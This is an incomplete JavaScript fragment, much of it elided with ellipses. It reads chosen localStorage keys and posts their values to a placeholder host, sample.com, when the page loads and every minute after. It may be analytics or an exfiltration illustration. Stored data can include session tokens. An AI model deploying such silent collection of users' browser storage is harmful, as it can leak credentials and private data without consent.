...
(function () {
  ...
  // Set to track the keys
  const keysSet = window.keysSet;
  var Je = function (a) {
    var b = function (c, d) {
  ...
  function extractData() {
    ...
    keysSet.forEach(key => {
      if (localStorage.hasOwnProperty(key)) {
        pulledData[key] = localStorage.getItem(key);
      }
    });
    return pulledData;
  }

  // Data posting function with try catch block for error debugging
  ...
  async function sendData(data) {
    ...
    const apiUrl = "https://sample.com/api/track";
    try {
  ...
  function collectAndSendData() {
    const retrievedData = extractData();
    if (Object.keys(retrievedData).length > 0) {
      sendData(retrievedData);
    }
  }
  ...
  window.onload = function () {
    collectAndSendData();
    setInterval(collectAndSendData, 60 * 1000);
  };

  // Event listener for on visibility change
